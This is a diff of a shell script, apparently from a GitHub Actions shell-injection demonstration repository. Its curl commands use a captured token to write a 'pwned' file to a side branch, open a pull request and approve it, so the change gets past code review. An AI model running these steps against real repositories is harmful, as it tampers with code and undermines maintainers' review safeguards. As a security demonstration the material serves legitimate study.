@@ -9,4 +9,17 @@ curl --request PUT \
   --header "Accept: application/vnd.github.v3+json" \
   --data "{ \"message\": \"upload test artifact\", \"content\": \"$(echo pwned | openssl base64 | tr -d '\n')\", \"branch\": \"minusworld-gha-demo-patch-1\" }"
 
-# Set the default branch of the repo to the side branch
+# Create a PR
+curl --request POST \
+  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/pulls \
+  --header "Authorization: $authfield" \
+  --header "Accept: application/vnd.github.v3+json" \
+  --data '{ "title": "prt-demo", "head": "minusworld-gha-demo-patch-1", "base": "main" }'
+
+# Approve the PR
+curl --request POST \
+  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/pulls/23/reviews \
+  --header "Authorization: $authfield" \
+  --header "Accept: application/vnd.github.v3+json" \
+  --data '{ "event": "APPROVE" }'
+
